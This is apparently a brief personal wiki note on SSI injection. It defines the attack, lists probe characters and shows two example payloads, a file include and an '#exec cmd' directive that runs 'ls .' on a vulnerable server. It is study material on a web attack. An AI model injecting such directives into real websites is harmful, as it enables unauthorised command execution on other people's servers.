---
tags:
  - security
  - web
aliases:
  - SSI Injection
---
An attack against webpages that allow [[Server Side Include|SSI]] scripts.
Involves executing attacker-made [[Server Side Include|SSI]]
# Probing
`< ! # = / . " - > and [a-zA-Z0-9]`
# Including Files
```
<!--#include file="header.html" -->
```
# Executing Programs
```
<!--#exec cmd="ls ." -->
```